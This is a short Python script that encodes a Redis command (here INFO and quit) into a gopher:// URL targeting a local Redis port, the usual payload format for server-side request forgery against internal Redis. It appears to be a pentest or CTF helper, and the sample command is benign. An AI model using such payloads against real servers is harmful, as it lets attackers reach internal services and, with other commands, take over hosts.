host = "127.0.0.1"
port = 6379

# Command to run on Redis
info_command = """
INFO
quit
"""


def redisToGopher(redis_command: str):
    return redis_command.replace("\r", " ").replace("\n", "%0D%0A").replace(" ", "%20")


def generateGopher(redisCommand):
    return "gopher://{host}:{port}/_{command}".format(
        host=host, port=port, command=redisToGopher(redisCommand)
    )


print(generateGopher(info_command))
